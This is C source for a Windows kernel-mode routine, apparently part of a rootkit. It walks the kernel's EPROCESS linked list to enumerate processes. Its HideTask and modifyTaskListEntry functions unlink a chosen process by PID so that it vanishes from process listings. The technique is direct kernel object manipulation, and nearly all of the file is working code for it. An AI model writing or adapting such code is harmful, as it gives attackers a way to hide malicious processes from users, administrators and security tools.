//tested 7/28/2015, works!
BYTE * getNextPEP(BYTE * currentPEP)
{
	BYTE * nextPEP = NULL;
	BYTE * fLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	fLink = (BYTE *)(listEntry.Flink);
	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
	return(nextPEP);
}
//tested 7/28/2015, works!
BYTE * getPreviousPEP(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* bLink = NULL;
	LIST_ENTRY listEntry;
	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	bLink = (BYTE *)(listEntry.Blink);
	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
	return(prevPEP);
}
//tested 7/28/2015, works!
void getTaskName(char * dest, char *src)
{
	strncpy(dest, src, SZ_EPROCESS_NAME);
	dest[SZ_EPROCESS_NAME - 1] = '\0';
	return;
}
//tested 7/28/2015, works!
int getPID(BYTE * currentPEP)
{
	int * pid;
	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
	return(*pid);
}
//Tested 7/28/2015, works!
void printNameInHex(BYTE * src)
{
	int i;
	DBG_PRINT1("	");
	for (i = 0; i <SZ_EPROCESS_NAME; i++)
	{
		DBG_PRINT2(" [%02x] ", src[i]);
	}
	return;
}
//Tested on 07/28/2015, works
void ListTasks()
{
	BYTE* currentPEP = NULL;
	BYTE * nextPEP = NULL;
	int currentPID = 0;
	int startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];

	//use the following variables to prevent infinite loops
	int fuse = 0;
	const int BLOWN = 1048576;
	//get the current EPROCESS block
	//get system
	currentPEP = (BYTE *)PsGetCurrentProcess();
	//get system PID
	currentPID = getPID(currentPEP);
	//get process name
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT1("ListTasks: Enumeration[Begin]\n");
	startPID = currentPID;
	DBG_PRINT3(" %s [PID(%d)] :\n", name, currentPID);
	//printNameInHex(name);

	//get the next EPROCESS block
	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	//iterate through the rest of the EPROCESS blocks
	while (startPID != currentPID)
	{
		DBG_PRINT3(" %s [PID(%d)]:\n", name, currentPID);
		//printNameInHex(name);
		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == BLOWN)
		{
			DBG_TRACE("ListTasks", "--BAM!--YOu just blew a fuse, dude");
			return;
		}
	}
	DBG_PRINT2(" %d Tasks Listed\n", fuse);
	DBG_PRINT1("ListTasks : Enumeration [Done] \n");
	return;
}

void modifyTaskListEntry(UCHAR * currentPEP)
{
	BYTE * prevPEP = NULL;
	BYTE * nextPEP = NULL;

	int currentPID = 0;
	int prevPID = 0;
	int nextPID = 0;

	BYTE currentName[SZ_EPROCESS_NAME];
	BYTE prevName[SZ_EPROCESS_NAME];
	BYTE nextName[SZ_EPROCESS_NAME];

	LIST_ENTRY* currentListEntry;
	LIST_ENTRY* prevListEntry;
	LIST_ENTRY* nextListEntry;

	currentPID = getPID(currentPEP);
	getTaskName(currentName, (currentPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry : Current is %s[PID=%d]\n", currentName, currentPID);

	prevPEP = getPreviousPEP(currentPEP);
	prevPID = getPID(prevPEP);
	getTaskName(prevName, (prevPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry: Prey is %s[PID=%d]\n", prevName, prevPID);

	nextPEP = getNextPEP(currentPEP);
	nextPID = getPID(nextPEP);
	getTaskName(nextName, (nextPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry: Next is %s [PID=%d] \n", nextName, nextPID);

	currentListEntry = ((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevPEP + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextPEP + EPROCESS_OFFSET_LINKS));

	DBG_PRINT3("modifyTaskListEntry: removing %s [PID=%d] \n", currentName, currentPID);
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;
	return;
}

void modifyTaskList(DWORD pid)
{
	BYTE* currentPEP = NULL;
	BYTE * nextPEP = NULL;

	int currentPID = 0;
	int startPID = 0;

	BYTE name[SZ_EPROCESS_NAME];
	// use the following variables to prevent infinite loops
	int fuse = 0;
	const int BLOWN = 1048576;

	currentPEP = (UCHAR*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

	DBG_PRINT1("modifyTaskList: Search[Begin]\n");

	startPID = currentPID;
	DBG_PRINT3(" %s [PID(%d)]:\n", name, currentPID);
	if (currentPID == pid)
	{
		modifyTaskListEntry(currentPEP);
		DBG_PRINT2("modifyTaskList: Search [Done] PID=%d Hidden\n", pid);
		return;
	}
	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

	while (startPID != currentPID)
	{
		DBG_PRINT3(" %s [PID(%d)] : \n ", name, currentPID);
		if (currentPID == pid)
		{
			modifyTaskListEntry(currentPEP);
			DBG_PRINT2("modifyTaskList : Search(Done] PID=%d Hidden\n", pid);
			return;
		}
		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == BLOWN)
		{
			DBG_TRACE("ListTasks", "--POP! -- ... You blew a fuse");
			return;
		}
	}
	DBG_PRINT2("' %d Tasks Listed\n", fuse);
	DBG_PRINT2("modifyTaskList : Search(Done] ... No task found with PID=%d\n", pid);
	return;
}

void HideTask(DWORD* pid)
{
	KIRQL irql;
	PKDPC dpcptr;
	DBG_PRINT2("HideTask: hiding PID[%d] \n", *pid);
	irql = RaiseIRQL();
	dpcptr = AcquireLock();
	modifyTaskList(*pid);
	ReleaseLock(dpcptr);
	LowerIRQL(irql);
	return;
}